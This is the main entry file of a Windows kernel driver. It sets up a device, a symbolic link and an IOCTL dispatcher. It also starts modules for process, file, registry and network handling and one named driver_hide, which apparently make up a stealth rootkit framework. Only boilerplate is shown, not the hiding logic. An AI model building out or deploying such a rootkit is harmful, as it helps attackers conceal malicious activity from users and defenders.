#include "..\..\includes\shared.h"

extern void process_init(void);
extern void process_cleanup(void);
extern void protect_init(void);
extern void protect_cleanup(void);
extern void file_init(void);
extern void file_cleanup(void);
extern void net_init(void);
extern void net_cleanup(void);
extern void reg_init(void);
extern void reg_cleanup(void);
extern void driver_hide_init(void);
extern void driver_hide_cleanup(void);
extern void thread_init(void);
extern void thread_cleanup(void);
extern void callback_init(void);
extern void callback_cleanup(void);
extern NTSTATUS ioctl_dispatch(PDEVICE_OBJECT device, PIRP irp);

PDEVICE_OBJECT g_device = NULL;
PDRIVER_OBJECT g_driver = NULL;

NTSTATUS dispatch_create(PDEVICE_OBJECT device, PIRP irp)
{
    UNREFERENCED_PARAMETER(device);
    irp->IoStatus.Status = STATUS_SUCCESS;
    irp->IoStatus.Information = 0;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS dispatch_close(PDEVICE_OBJECT device, PIRP irp)
{
    UNREFERENCED_PARAMETER(device);
    irp->IoStatus.Status = STATUS_SUCCESS;
    irp->IoStatus.Information = 0;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS dispatch_ioctl(PDEVICE_OBJECT device, PIRP irp)
{
    return ioctl_dispatch(device, irp);
}

void driver_unload(PDRIVER_OBJECT driver)
{
    UNICODE_STRING symlink;

    UNREFERENCED_PARAMETER(driver);
    callback_cleanup();
    if (g_device) {
        RtlInitUnicodeString(&symlink, symlink_name);
        IoDeleteSymbolicLink(&symlink);
        IoDeleteDevice(g_device);
    }
    thread_cleanup();
    driver_hide_cleanup();
    reg_cleanup();
    net_cleanup();
    file_cleanup();
    protect_cleanup();
    process_cleanup();
}

NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)
{
    NTSTATUS status;
    UNICODE_STRING dev_name;
    UNICODE_STRING symlink;

    UNREFERENCED_PARAMETER(reg_path);
    g_driver = driver;
    process_init();
    protect_init();
    file_init();
    net_init();
    reg_init();
    driver_hide_init();
    thread_init();
    callback_init();
    RtlInitUnicodeString(&dev_name, device_name);
    status = IoCreateDevice(driver, 0, &dev_name, FILE_DEVICE_UNKNOWN, 0, FALSE, &g_device);
    if (!NT_SUCCESS(status)) goto fail;
    RtlInitUnicodeString(&symlink, symlink_name);
    status = IoCreateSymbolicLink(&symlink, &dev_name);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(g_device);
        g_device = NULL;
        goto fail;
    }
    driver->MajorFunction[IRP_MJ_CREATE] = dispatch_create;
    driver->MajorFunction[IRP_MJ_CLOSE] = dispatch_close;
    driver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispatch_ioctl;
    driver->DriverUnload = driver_unload;
    return STATUS_SUCCESS;
fail:
    callback_cleanup();
    thread_cleanup();
    driver_hide_cleanup();
    reg_cleanup();
    net_cleanup();
    file_cleanup();
    protect_cleanup();
    process_cleanup();
    return status;
}
